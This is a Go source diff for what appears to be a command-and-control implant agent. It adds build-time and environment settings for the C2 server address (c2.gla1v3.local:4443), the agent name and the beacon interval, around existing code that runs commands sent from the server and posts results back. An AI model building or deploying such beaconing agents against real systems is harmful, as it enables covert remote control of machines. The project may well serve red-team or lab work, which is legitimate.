@@ -15,6 +15,12 @@ import (
 	"time"
 )
 
+// Build-time configuration (injected via -ldflags)
+var (
+	BeaconInterval = "30s" // Default beacon interval
+	C2Server       = "c2.gla1v3.local:4443" // Default C2 server
+)
+
 // executeTask runs a task and sends the result back to C2
 func executeTask(client *http.Client, c2URL, agentID, taskID, cmd string, args []string) {
 	log.Printf("Executing task %s: %s %v", taskID, cmd, args)
@@ -178,16 +184,26 @@ func main() {
 	whoamiToken := os.Getenv("AGENT_WHOAMI_TOKEN")
 
 	// 4. Beacon loop with whoami execution and JSON POST
-	agentID := "agent-" + fmt.Sprintf("%d", time.Now().UnixNano())
+	agentID := os.Getenv("AGENT_NAME")
+	if agentID == "" {
+		agentID = "agent-" + fmt.Sprintf("%d", time.Now().UnixNano())
+	}
 
-	// Configurable via env
+	// Use build-time configuration (can be overridden by env vars)
 	c2URL := os.Getenv("C2_URL")
 	if c2URL == "" {
-		c2URL = "https://c2.gla1v3.local:4443/beacon"
+		c2URL = "https://" + C2Server + "/beacon"
 	}
-	beaconInterval := 8 * time.Second
-	if v := os.Getenv("BEACON_INTERVAL_SEC"); v != "" {
-		if iv, err := time.ParseDuration(v + "s"); err == nil {
+	
+	beaconInterval, err := time.ParseDuration(BeaconInterval)
+	if err != nil {
+		log.Printf("Invalid BeaconInterval '%s', using default 30s", BeaconInterval)
+		beaconInterval = 30 * time.Second
+	}
+	
+	// Env var can override build-time config
+	if v := os.Getenv("BEACON_INTERVAL"); v != "" {
+		if iv, err := time.ParseDuration(v); err == nil {
 			beaconInterval = iv
 		}
 	}
